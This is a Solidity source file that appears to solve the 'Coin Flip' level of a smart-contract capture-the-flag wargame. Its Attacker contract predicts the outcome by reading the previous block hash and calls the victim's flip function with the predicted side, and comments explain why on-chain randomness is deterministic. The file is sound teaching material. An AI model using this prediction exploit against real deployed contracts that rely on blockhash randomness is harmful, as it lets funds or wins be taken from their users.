//////////////////////////////////////
// Level 3 - Coin Flip
// By: Lorenzo Cesconetto
//////////////////////////////////////

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flip(bool _guess) public virtual returns (bool);
}

//////////////////////////////////////
// SOLUTION
//////////////////////////////////////
// Generating random numbers within blockchain is an unsolved problem
// The very nature of blockchain demands deterministic operations
contract Attacker {
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip private victim;

    constructor(address _addr) {
        victim = CoinFlip(_addr);
    }

    // Call this function 10 times
    // Notice that if you submit two transactions within the same block the transaction will fail
    // if (lastHash == blockValue) {
    //   revert();
    // }
    // So you should space your submissions by some seconds
    function flipCoin() external {
        // This attacker contract can anticipate what the Coin Flip result will be
        // Because blockhash is deterministic and division is deterministic
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool side = blockValue / FACTOR == 1;
        victim.flip(side);
    }
}
